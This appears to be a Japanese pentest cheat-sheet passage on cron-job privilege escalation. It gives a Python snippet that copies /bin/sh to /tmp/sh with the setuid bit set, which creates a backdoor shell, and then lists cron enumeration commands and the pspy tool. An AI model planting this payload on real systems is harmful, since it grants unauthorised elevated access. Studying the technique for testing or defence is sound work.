## Cron Job
### Pythonで書かれているファイルに付与する例

以下のPythonコードを実行した後、`./sh`を実行します。

```python
#!/usr/bin/env python
import os
import sys
try:
        os.system('cp /bin/sh /tmp/sh ')
        os.system('chmod u+s /tmp/sh ')
except:
        sys.exit()
```

このコードは、`/bin/sh`を`/tmp/sh`にコピーし、`setuid`ビットを設定することで、`/tmp/sh`を実行するときに所有者の権限で実行されるようにします。

---

### Cronジョブの検出

Cronジョブを確認するために、以下のコマンドを使用します。

#### `/etc/crontab`ファイルの内容を表示
```bash
cat /etc/crontab
```

#### 現在のユーザーのCronジョブを表示
```bash
crontab -l
```

#### pspyツールの利用
`pspy`は、Linux上でリアルタイムに発生しているアクティビティを監視するための便利なツールです。
```
